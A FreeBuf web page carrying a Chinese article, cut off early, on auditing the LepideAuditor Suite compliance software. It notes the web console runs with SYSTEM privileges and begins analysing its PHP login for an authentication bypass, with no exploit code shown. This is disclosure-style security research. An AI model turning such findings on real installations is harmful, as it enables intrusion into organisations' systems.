<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>
  对安全审计软件的一次安全审计 - FreeBuf.COM | 关注黑客与极客</title>
<meta name="description" content="前段时间，我们注意到，一些安全研究者正对杀毒软件等安全产品的重要漏洞进行了相关研究，而这些安全产品可能对企业和桌面用户造成破坏性影响。看看Google Project Zero对Kaspersky、Comodo、Avast等多种杀毒软件…" />
<meta name="keywords" content="安全, 审计软件, WEB安全渗透测试报告,WEB安全大事件点评,WEB安全技术" />
<meta name="baidu-site-verification" content="nKKKqQxp6R" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta property="qc:admins" content="6620477777662552566375" />
<link rel='stylesheet' id='wpfp-css' href='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.css' type='text/css' />
<link rel='stylesheet' id='wp-recentcomments-css'  href='http://static.3001.net/css/recentcomments/wp-recentcomments.css?ver=2.2.3' type='text/css' media='screen' />
<link rel='stylesheet' id='mycred-widget-css'  href='http://www.freebuf.com/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1' type='text/css' media='all' />
<script type='text/javascript' src='http://static.3001.net/js/header/jquery.min.js?ver=3.6.1'></script>
<script type='text/javascript' src='http://www.freebuf.com/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1'></script>
<link rel='prev' title='基于Centos搭建ELK环境指南' href='http://www.freebuf.com/sectool/139687.html' />
<link rel='next' title='Exploit-database使用新手指南' href='http://www.freebuf.com/sectool/139685.html' />
<link rel='canonical' href='http://www.freebuf.com/articles/web/139719.html' />
<link rel='shortlink' href='http://www.freebuf.com/?p=139719' />

<link rel="stylesheet" href="http://static.3001.net/css/highslide/highslide.css" type="text/css" />
<script type="text/javascript" src="http://static.3001.net/js/highslide/highslide-with-html.packed.js"></script>
<script type="text/javascript">
jQuery(document).ready(function($) {
    hs.graphicsDir = "http://www.freebuf.com/buf/plugins/auto-highslide/images/graphics/";
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.addSlideshow({
        interval: 5000,
        repeat: true,
        useControls: true,
        fixedControls: "fit",
        overlayOptions: {
            opacity: 0.75,
            position: "bottom center",
            hideOnMouseOut: true

        }

    });
});
</script>
          <script language="JavaScript" type="text/javascript" src="http://www.freebuf.com/buf/plugins/cartpauj-pm/js/script.js"></script>
      <link rel="stylesheet" type="text/css" href="http://www.freebuf.com/buf/plugins/cartpauj-pm/style/style.css" />
      <script type="text/javascript" src="http://www.freebuf.com/buf/plugins/simditor/highlight/highlight.pack.js"></script><link type="text/css" rel="stylesheet" href=" http://www.freebuf.com/buf/plugins/simditor/highlight/styles/default.css" />	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<link rel="shortcut icon" href="http://static.freebuf.com/images/favicon.ico" />
<link rel="stylesheet" href="http://static.3001.net/css/new/header.css" />
<link href="http://static.3001.net/css/new/bootstrap.min.css?ver=2016051701" rel="stylesheet" media="screen">
    <!--轮播图-->
    <link href="http://static.3001.net/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css">
    <link href="http://static.3001.net/css/new/style.css?ver=20170912568" rel="stylesheet" type="text/css">
    <style type="text/css">
#contenttxt hr {
  display: block;
  height: 0px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 15px 0;
  padding: 0;
}
#contenttxt table {
  width: 100%;
  table-layout: fixed;
  border-collapse: collapse;
  border-spacing: 0;
  margin: 15px 0;
}
#contenttxt table thead {
  background-color: #f9f9f9;
}
#contenttxt table td, #contenttxt table th {
  min-width: 40px;
  height: 30px;
  border: 1px solid #ccc;
  vertical-align: top;
  padding: 2px 4px;
  text-align: left;
  box-sizing: border-box;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
#contenttxt table td.active, #contenttxt table th.active {
  background-color: #ffffee;
  white-space: pre-wrap; white-space: -moz-pre-wrap; white-space: -pre-wrap; white-space: -o-pre-wrap; word-wrap: break-word;
}
</style>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/bootstrap.min.js"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
<script src="http://static.3001.net/js/focus/bjqs-1.3.min.js" type="text/javascript" ></script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript" ></script>
<script type="text/javascript" src="http://static.3001.net/js/new/setint.js"></script>
    <!--轮播图-->
    <script src="http://static.3001.net/js/colum/swiper-3.4.2.min.js"></script>
<!--[if lt IE 9]>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/html5shiv.min.js"></script>
    <script src="http://www.freebuf.com/buf/themes/freebuf/js/respond.min.js"></script>
<![endif]-->
    <style>
        @font-face {font-family: 'iconfont';
            src: url('http://static.3001.net/iconfont/iconfont.eot'); /* IE9*/
            src: url('http://static.3001.net/iconfont/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
            url('http://static.3001.net/iconfont/iconfont.woff') format('woff'), /* chrome、firefox */
            url('http://static.3001.net/iconfont/iconfonticonfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
            url('http://static.3001.net/iconfont/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
        }
    </style>
</head>

<body>
<!----------header---------->
<!--头部导航-->
<div id="undefined-sticky-wrapper" class="sticky-wrapper is-sticky">
    <div class="main-header">
        <div class="header">
            <div class="header-container clearfix">
                                <div class="header-logo"><a href="http://www.freebuf.com"></a></div>
                                        <!-- column -->
                        <div class="nav">
                            <ul class="nav-child clearfix">
                                <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li data-value="read-menu">
                                    <a href="#">分类阅读<b class="triangle-down triangle-down-04"></b></a>
                                </li>
                                <li data-value="wenku-menu"><a href="javascript:;" target="_blank">文库<b class="triangle-down triangle-down-04"></b></a></li>
                                <li>
                                    <a href="http://zhuanlan.freebuf.com" target="_blank">专栏</a><b class="icon-betr"></b>
                                </li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li data-value="company-menu"><a href="javascript:;" >企业服务<b class="triangle-down triangle-down-04"></b></a></li>
                                <li data-value="user-menu"><a href="javascript:;" >用户服务<b class="triangle-down triangle-down-04"></b></a></li>
                            </ul>
                        </div>
                                        <div class="header-right">
                                    <div class="loginSign login-before">
                        <a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                        |
                        <a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a>
                    </div>
                                    <!--搜索-->
                    <div class="search-form-inner clearfix">
                        <i class="searchdisplayico"></i>
                        <div class="form-group has-active search-col search-form-text">
                            <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch();">
                                <div class="form-group">
                                    <input id="bigq" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                    <button class="submit" type="submit"></button>
                                </div>
                            </form>
                        </div>
                    </div>
                    <!--<script>
                        $('.search-form-inner .searchdisplayico').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $(this).siblings('.search-col').addClass('active');
                        });
                        $('.search-form-inner .search-col').click(function(event) {
                            var evt = evt || event;
                            evt.stopPropagation();
                            $('.search-form-inner .search-col').addClass('active');
                        });
                        $(document).click(function() {
                            $('.search-form-inner .search-col').removeClass('active');
                        });
                    </script>-->
                                    <div class="btn-publish">
                        <a href="#">投稿</a>
                        <div class="btn-publish-child">
                            <ul class="btn-child clearfix">
                                <li><a href="http://my.freebuf.com/post/edit/" target="_blank">文章撰写</a></li>
                                <li><hr/></li>
                                <li><a href="http://my.freebuf.com/post/article/" target="_blank">投稿管理</a></li>
                                                        </ul>
                        </div>
                    </div>
                </div>
                <div class="nav-small">
                    <a href="#">&#xe634;</a>
                    <ul class="nav-child clearfix">
                                                        <li class=" index">
                                    <a href="http://www.freebuf.com">首页</a></li>
                                <li class="read-classify">
                                    <a href="#">分类阅读<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2 read-classify clearfix">
                                        <li>
                                            <strong>黑客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                                <a href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>极客</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                                <a href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                                            </div>
                                        </li>
                                        <li>
                                            <strong>特色</strong>
                                            <div class="nav-item">
                                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                                <a href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                                            </div>
                                        </li>
                                    </ul>
                                </li>
                                <li><a href="http://zhuanlan.freebuf.com/" target="_blank">专栏</a></li>
                                <li><a href="http://open.freebuf.com" target="_blank">公开课</a></li>
                                <li><a href="http://shop.freebuf.com" target="_blank">商城</a></li>
                                <li>
                                    <a href="javascript:;" target="_blank">企业服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank"><strong>企业SRC</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://company.freebuf.com" target="_blank"><strong>企业空间</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/" target="_blank"><strong>安全测试</strong></a>
                                        </li>
                                        <li>
                                            <a href="https://www.riskivy.com/" target="_blank"><strong>风险感知</strong></a>
                                        </li>

                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">用户服务<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/newsend" target="_blank"><strong>有奖投稿</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                        </li>
                                        <li>
                                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank"><strong>提交漏洞</strong></a>
                                        </li>
                                        <li class="last">
                                            <a href="https://www.vulbox.com/bounties" target="_blank"><strong>参与众测</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <a href="javascript:;" target="_blank">文库<b class="icon-arrow"></b></a>
                                    <ul class="nav-child2">
                                        <li>
                                            <a href="http://www.freebuf.com/wenku" target="_blank"><strong>文库</strong></a>
                                        </li>
                                        <li>
                                            <a href="http://www.freebuf.com/special-subject" target="_blank"><strong>专题</strong></a>
                                        </li>
                                    </ul>
                                </li>
                                                    <li><a href="http://my.freebuf.com/post/edit" target="_blank">投稿</a></li>
                                                    <li><a href="https://account.tophant.com/register.html" class="login-btn">注册</a>
                            </li>
                            <li><a href="http://www.freebuf.com/oauth" class="sign-btn">登录</a></li>
                                            </ul>
                </div>
            </div>
            <div class="dropdown-menu read-menu" id="read-menu">
                <div class="container">
                    <ul class="menu clearfix">
                        <li>
                            <strong>黑客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/vuls" target="_blank">漏洞</a>
                                <a href="http://www.freebuf.com/sectool" target="_blank">安全工具</a>
                                <a href="http://www.freebuf.com/articles/web" target="_blank">WEB安全</a>
                                <a href="http://www.freebuf.com/articles/system" target="_blank">系统安全</a>
                                <a href="http://www.freebuf.com/articles/network" target="_blank">网络安全</a>
                                <a href="http://www.freebuf.com/articles/wireless" target="_blank">无线安全</a>
                                <a href="http://www.freebuf.com/articles/terminal" target="_blank">设备/客户端安全</a>
                                <a href="http://www.freebuf.com/articles/database" target="_blank">数据库安全</a>
                                <a href="http://www.freebuf.com/articles/security-management" target="_blank">安全管理</a>
                                <a href="http://www.freebuf.com/articles/es" target="_blank">企业安全</a>
                                <a class="last" href="http://www.freebuf.com/ics-articles" target="_blank">工控安全</a>
                            </div>
                        </li>
                        <li>
                            <strong>极客</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/geek" target="_blank">极客有意思</a>
                                <a class="last" href="http://www.freebuf.com/news/others" target="_blank">周边</a>
                            </div>
                        </li>
                        <li>
                            <strong>特色</strong>
                            <div class="nav-item">
                                <a href="http://www.freebuf.com/news/special" target="_blank">头条</a>
                                <a href="http://www.freebuf.com/articles/people" target="_blank">人物志</a>
                                <a href="http://www.freebuf.com/fevents" target="_blank">活动</a>
                                <a href="http://www.freebuf.com/video" target="_blank">视频</a>
                                <a href="http://www.freebuf.com/articles/neopoints" target="_blank">观点</a>
                                <a href="http://www.freebuf.com/jobs" target="_blank">招聘</a>
                                <a class="last" href="http://www.freebuf.com/paper/" target="_blank">报告</a>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu company-menu" id="company-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="https://www.vulbox.com/bounties/item-9-0-1" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-src.png"></span>
                                <span class="name">企业SRC</span>
                                <span class="intro">全/半托管式互联网漏洞收集管理</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://company.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-company.png"></span>
                                <span class="name">企业空间</span>
                                <span class="intro">为企业定制信息安全专属门户</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-safety.png"></span>
                                <span class="name">安全测试</span>
                                <span class="intro">国内领先的互联网安全众测服务</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.riskivy.com/" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-risk.png"></span>
                                <span class="name">风险感知</span>
                                <span class="intro">基于IT资产的自动化安全监控</span>
                            </a>
                        </li>

                    </ul>
                </div>
            </div>
            <div class="dropdown-menu user-menu" id="user-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/newsend" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">有奖投稿</span>
                                <span class="intro">与整个行业分享你的经验与见解</span>
                            </a>
                        </li>
                        <li>
                            <a href="http://zhuanlan.freebuf.com" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-column.png"></span>
                                <span class="name">申请专栏</span>
                                <span class="intro">自由创作，打造自主内容品牌</span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.vulbox.com/bounties/detail-72" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-leak.png"></span>
                                <span class="name">提交漏洞</span>
                                <span class="intro">与数万白帽一起，让互联网更安全</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="https://www.vulbox.com/bounties" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">参与众测</span>
                                <span class="intro">挖洞开启自由职业之路</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
            <div class="dropdown-menu wenku-menu" id="wenku-menu">
                <div class="container">
                    <ul class="menu">
                        <li>
                            <a href="http://www.freebuf.com/wenku" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-write.png"></span>
                                <span class="name">文库</span>
                                <span class="intro">最全的FB百科</span>
                            </a>
                        </li>
                        <li class="last">
                            <a href="http://www.freebuf.com/special-subject" target="_blank">
                                <span class="img"><img src="http://image.3001.net/images/header/icon-test.png"></span>
                                <span class="name">专题</span>
                                <span class="intro">浓缩的安全精华汇总</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
<!----------header end---------->
<!--<script type="application/javascript">
    var  _value_tab = '';
    $(function(){
        var _that = '', _show_flag = 0;
        $('.header .header-container .nav .nav-child > li:not(input[data-value])').mouseover(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        $('.header').mouseout(function() {
            $('.header .dropdown-menu').stop().slideUp(50);
        });
        /*$('.header .header-container .nav .nav-child > li').mouseover(function() {
         _value_tab = $(this).attr('data-value');
         $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
         $('#'+_value_tab).stop().slideDown(100);
         });*/
        $(".header .header-container .nav .nav-child > li").hoverDelay({
            hoverDuring: 500,
            hoverEvent: function(){
                $('#'+_value_tab).siblings('.dropdown-menu').stop().slideUp(50);
                $('#'+_value_tab).stop().slideDown(100);
            }
        });
        $('.header .dropdown-menu').mouseover(function() {
            _value_tab = $(this).attr('id');
            _that = this;
            $('.nav-child li[data-value="'+_value_tab+'"]').addClass('hover');
            $(this).stop().slideDown(50);
        }).mouseout(function() {
            $('.nav-child li[data-value="'+_value_tab+'"]').removeClass('hover');
            $(_that).stop().slideUp(50);
        });

        $(".nav-small .nav-child > li").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();

            if($(this).find('.nav-child2').is(":hidden")) {
                _show_flag = 1;
                $(this).find('.nav-child2').slideDown();
                $(this).find('.icon-arrow').addClass('bottom');
            }else {
                _show_flag = 0;
                $(this).find('.nav-child2').slideUp();
                $(this).find('.icon-arrow').removeClass('bottom');
            }
            $(this).siblings().find('.nav-child2').slideUp();
            $(this).siblings().find('.icon-arrow').removeClass('bottom');
        });
        //头部投稿按钮hover状态展开菜单
        $(".btn-publish-child > ul > li").hover(function(){
            $(this).addClass("active");
            $(this).siblings().removeClass("active");
        });

        $(document).click(function(event){
            var ev = ev || event;
            $(".login-after").find(".login-after-child").hide();
        });
        //点击用户信息，出现下拉菜单
        $("#user-info").click(function(event){
            var ev = ev || event;
            ev.stopPropagation();
            $(".login-after").find(".login-after-child").toggle();
        });
        //顶部导航
        $(".nav-small").click(function(){
            $(this).find(".nav-child").slideToggle();
        });
        var that = '';
        $('.header .header-container .nav .nav-child > li').mouseover(function() {
            that = this;
            $(this).find('.dropdown-menu').stop().slideDown(200);
        }).mouseout(function() {
            $(that).find('.dropdown-menu').stop().slideUp(200);
        });
    });
    $(".nav-small .nav-child > li").click(function(event){
        var ev = ev || event;
        ev.stopPropagation();
        $(this).siblings('li').find('.dropdown-menu').hide();
        $(this).find(".dropdown-menu").toggle();
    });
    //鼠标经过(hover)事件的延时处理
    (function($){
        $.fn.hoverDelay = function(options){
            var defaults = {
                hoverDuring: 100,
                outDuring: 100,
                hoverEvent: function(){
                    $.noop();
                },
                outEvent: function(){
                    $.noop();
                }
            };
            var sets = $.extend(defaults,options || {});
            var hoverTimer, outTimer;
            return $(this).each(function(){
                $(this).hover(function(){
                    _value_tab = $(this).attr('data-value');
                    clearTimeout(outTimer);
                    hoverTimer = setTimeout(sets.hoverEvent, sets.hoverDuring);
                },function(){
                    clearTimeout(hoverTimer);
                    outTimer = setTimeout(sets.outEvent, sets.outDuring);
                });
            });
        }
    })(jQuery);
</script>-->
<script type="text/javascript" src="http://static.3001.net/js/header/header.js"></script><script>
    jQuery(window).load(function(){
      if(jQuery(window).width()>480){
        jQuery(".main-header").sticky({ topSpacing: 0 });
      }else{
        jQuery(".main-header nav").removeClass("navbar-fixed-top");
      }
      jQuery("#mar-right").sticky({ topSpacing: 105,bottomSpacing: 410 });
    });
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/layer.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/pretty/prettify.js"></script>
<script type="text/javascript" src="http://static.3001.net/js/header/lazyload.js"></script>
<script type="text/javascript" charset="utf-8">
      jQuery(function() {
          jQuery("img").lazyload({
              effect : "fadeIn"
          });
      });
 </script>
<script type="text/javascript">
    window.onload = function(){
        prettyPrint();
    }
</script>
<script language="JavaScript" type="text/javascript">
//<![CDATA[
var va = "您已经点亮过了";
function acv_vote(id,option, m){
  if( m==null) m =''; m = m + '';
  jQuery('#acv_stat_'+m+id).html('Loading...');
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option="+option+"&ID="+id;
  jQuery.get(url,function(d){
    d =d.split('|');var s='#acv_stat_'+m+d[0];
    var sele = '#cos_support-'+m+id,unsele = '#cos_unsupport-'+m+id,tpjs = 'javascript:alert(va)';
    jQuery( s ).html( d[1] );jQuery(s).fadeOut(400,function(){jQuery(s).fadeIn();});
    if( d[2] == 1 ){ jQuery(sele).html(jQuery(sele).html()*1+1); }
    if( d[2] == -1 ){ jQuery(unsele).html(jQuery(unsele).html()*1+1); }
    jQuery('#vote4-'+id).attr('href',tpjs);jQuery('#vote4-2'+id).attr('href',tpjs);
    jQuery('#votea-'+id).attr('href',tpjs);jQuery('#votea-2'+id).attr('href',tpjs);
  });
}
  
$(document).on("mouseenter",".comment-tools",function(){
  $(this).find(".btn-report").show();
  $(this).find(".btn-report").addClass("hover");
}).on("mouseleave",".comment-tools",function(){
  var $_this = $(this);
  $(this).find(".btn-report").removeClass("hover");
  if(!$(this).find(".dropup").hasClass('open')){
    $(this).find(".btn-report").hide(); 
    $_this.find(".dropdown-menu").css("display","none");
  }else{
    setTimeout(function(){
      if(!$_this.find(".btn-report").hasClass("hover")){
        $_this.find(".dropup").removeClass("open");
        $_this.find(".dropdown-menu").css("display","none");
        $_this.find(".btn-report").hide(); 
      }
    },"500");
  }
})

$(document).on("click",".click_report",function(){
  $(this).parent().parent().css("display","none");
  var id = $(this).attr("data-id");
  var url="http://www.freebuf.com/index.php?acv_ajax=true&option=0&ID="+id;
  $_this = $(this);
  jQuery.get(url,function(d){
    d =d.split('|');
    if(d[1]=='您已经点过灯了'){
      d[1] = '您已经举报过了';
    }
    if(d[1]=='Thank you'){
      d[1] = '举报成功';
    }
    $_this.parent().parent().parent().find(".btn-report").text(d[1]);
    $_this.parent().parent().parent().find(".btn-report").css("display","block");
  })
})

$(document).on("click",".btn-report",function(){
  if($(this).parent().hasClass('open')){
    $(this).parent().find(".dropdown-menu").css("display","block");
  }else{
    $(this).parent().find(".dropdown-menu").css("display","none");
  }
})
//]]>
</script>
<div class="column-article" data-column="">
            <div class="container pad-top35">
        <div class="row clearfix">
            <div class="col-md-9" id="getWidth">
                                    <div class="reletive search-xs-wrap">
                    <div class="form-group has-active search-col search-xs">
                        <form id="hpsform-new" class="navbar-search navbar-form" onsubmit="return dispatch()">
                            <div class="form-group">
                                <input id="q" class="input form-control" type="text" placeholder="关键字查找" autocomplete="off" title="关键字查找" name="q">
                                <button class="submit" type="submit"></button>
                            </div>
                        </form>
                    </div>
                </div>
                    <script type="text/javascript">
                        var dispatch = function () {
                            console.log(123)
                            var q = document.getElementById("q");
                            if (q.value == "") {
                                q = document.getElementById("bigq");
                            }
                            if (q.value != "") {
                                window.open('http://www.freebuf.com/?s=' + q.value, "_blank");
                                return false;
                            } else {
                                return false;
                            }
                        }
                    </script>
                                <div class="article-wrap panel panel-default">
                                                            <div class="articlecontent">
                                                    <div class="title">
                                <h2>
                                    对安全审计软件的一次安全审计                                </h2>
                                <div class="property">
                                                                            <span class="name"><a href="http://www.freebuf.com/author/clouds" title="由 clouds 发布" rel="author">clouds</a></span>
                                                                        <span class="icon-f"><a href="http://zhuanlan.freebuf.com" target="_blank"><img src="http://image.3001.net/images/index/column-iden.png" title="专栏作者"></a></span>
                                    <span class="time">2017-07-12</span>
                                                                                                            <span class="look">共<strong>179960</strong>人围观
                                        ，发现 <strong>2</strong> 个不明物体 </span>                                      </span>
                                                                <span class="tags">
                                      <a href="http://www.freebuf.com/./articles/web">WEB安全</a></span>
                                    <span class="tags_01"></span>
                                </div>
                            </div>
                                                                                                <div id="contenttxt">
                            <p style="text-align: center;"><b><img width="690" height="246" alt="安全审计" data-original="http://image.3001.net/images/20170709/1499587184333.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></b></p>
<noscript><img width="690" height="246" alt="安全审计" src="http://image.3001.net/images/20170709/1499587184333.png!small"></b></p></noscript>
<p><b style="color: rgb(0, 176, 80);">前段时间，我们注意到，一些安全研究者正对杀毒软件等安全产品的重要漏洞进行了相关研究，而这些安全产品可能对企业和桌面用户造成破坏性影响。看看Google Project Zero对Kaspersky、Comodo、Avast等多种杀毒软件<a href="https://bugs.chromium.org/p/project-zero/issues/list?can=1&amp;q=owner:taviso@google.com" rel="nofollow">高危漏洞披露</a>，也够让我们震惊的了。</b></p>
<p>关键的问题是，现在人们普遍认为安全产品本身就是安全可靠的，而其实，安全产品本身引入的攻击面正逐步增加。甚至有一些安全专家认为，大多数杀毒软件企业技术已经落后于那些具备沙盒防护、漏洞缓解和成熟漏洞众测项目的互联网大公司。安全产品其实并不安全。就如同一年前我们对名为<a href="https://www.lepide.com/lepideauditor/" rel="nofollow">LepideAuditor Suite</a>的企业合规性审计软件进行的一些安全审计那样，它们也会出现漏洞，也会给用户造成安全影响。</p>
<h2>软件安装</h2>
<p>该软件套装为IT安全管理和审计之用，解压后，共包含四个安装组件，我们从Lepide Auditor Web Console开始安装：</p>
<p style="text-align: center;"><img width="690" height="197" alt="安装Lepide Auditor Web Console" data-original="http://image.3001.net/images/20170709/14995859705134.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">    </p>
<noscript><img width="690" height="197" alt="安装Lepide Auditor Web Console" src="http://image.3001.net/images/20170709/14995859705134.png!small">    </p></noscript>
<p>安装非常简单，结合WAMP可以访问到一个web接口，登录端要求客户端IP、用户名和密码。    </p>
<p style="text-align: center;"><img width="690" height="676" alt="Lepide 登录端" data-original="http://image.3001.net/images/20170709/14995860186442.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif">    </p>
<noscript><img width="690" height="676" alt="Lepide 登录端" src="http://image.3001.net/images/20170709/14995860186442.png!small">    </p></noscript>
<h2>审计开始</h2>
<p>待程序和服务启动之后，利用Process Explorer查看Lepide相关进程：</p>
<p style="text-align: center;"><img width="690" height="171" alt="利用Process Explorer查看Lepide相关进程" data-original="http://image.3001.net/images/20170709/14995860414210.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="171" alt="利用Process Explorer查看Lepide相关进程" src="http://image.3001.net/images/20170709/14995860414210.png!small"></p></noscript>
<p>观察发现，其web控制端以NT AUTHORITY\SYSTEM权限7778端口运行，具体文件位置于C:\LepideAuditorSuiteWebConsole\apache。查看该目录发现，Lepide是PHP架构。</p>
<h2>认证绕过</h2>
<p>从简单的开始，我们决定从认证机制开始研究：</p>
<p style="text-align: center;"><img width="690" height="132" alt="从认证机制开始研究" data-original="http://image.3001.net/images/20170709/14995860804696.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="132" alt="从认证机制开始研究" src="http://image.3001.net/images/20170709/14995860804696.png!small"></p></noscript>
<p>很快，在burpsuite帮助下，我们发现认证进程在获取服务端响应时需要花费稍长时间（大约为6秒），另外，程序在认证过程中还需要额外的服务端参数作为输入，这有点不正常。后经发现，原来这是Apache应用在执行DNS查询请求测试。</p>
<p>在没有用户登录账户和不具备太多登录功能的前提下，我们直接对其PHP源码进行了审计。首先来看看index.php页面的登录功能：</p>
<p style="text-align: center;"><img width="690" height="164" alt="index.php页面的登录功能" data-original="http://image.3001.net/images/20170709/14995861123120.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"></p>
<noscript><img width="690" height="164" alt="index.php页面的登录功能" src="http://image.3001.net/images/20170709/14995861123120.png!small"></p></noscript>
